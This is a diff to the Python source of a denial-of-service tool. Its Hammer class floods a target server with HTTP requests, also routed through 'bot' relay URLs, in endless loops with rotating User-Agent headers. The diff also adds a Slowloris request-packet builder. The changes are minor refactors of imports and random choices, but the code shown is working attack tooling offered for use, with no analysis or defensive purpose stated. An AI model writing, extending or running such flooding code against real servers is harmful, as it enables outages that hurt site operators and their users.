@@ -1,11 +1,11 @@
 from queue import Queue
 from optparse import OptionParser
 from termcolor import colored
+from random import choice, randint
 import sys
 import socket
 import urllib.request
 import time
-import random
 import threading
 
 
@@ -170,7 +170,7 @@ class Hammer:
 
         packet = f"{DefaultHttpParameters.Requests.get_requests}\n"
         packet += f"Host: {self.server}\n"
-        packet += f"User-Agent: {random.choice(DefaultHttpParameters.Headers.user_agents)}\n"
+        packet += f"User-Agent: {choice(DefaultHttpParameters.Headers.user_agents)}\n"
         packet += f"Accept-Language: {DefaultHttpParameters.Headers.accept_language}\n"
         packet += f"Accept-Encoding: {DefaultHttpParameters.Headers.accept_encoding}\n"
         packet += f"Accept-Charset: {DefaultHttpParameters.Headers.accept_charset}\n"
@@ -185,7 +185,7 @@ class Hammer:
         
         while True:
             self.queue_two.get()
-            self.bot_hammering(random.choice(self.hammer_bots)+"http://"+self.server)
+            self.bot_hammering(choice(self.hammer_bots)+"http://"+self.server)
             self.queue_two.task_done()
     
     def bot_hammering(self, url):
@@ -194,7 +194,7 @@ class Hammer:
         try:
             while True:
                 urllib.request.urlopen(urllib.request.Request(url, \
-                headers={'User-Agent': random.choice(DefaultHttpParameters.Headers.user_agents)}))
+                headers={'User-Agent': choice(DefaultHttpParameters.Headers.user_agents)}))
                 print(FontColors.blue("bot is hammering :0"))
                 time.sleep(.1)
         except:
@@ -239,6 +239,14 @@ class Slowloris:
         self.host = host_target
         self.port = port_target
         self.is_https = it_is_https
+    
+    def create_get_request_packet(self) -> bytes:
+        """ return request get """
+        
+        packet = \
+        f"{DefaultHttpParameters.Requests.lambda_get_requests(randint(0, 2000))}\r\n"
+        
+        return packet.encode("utf-8")
         
         
 
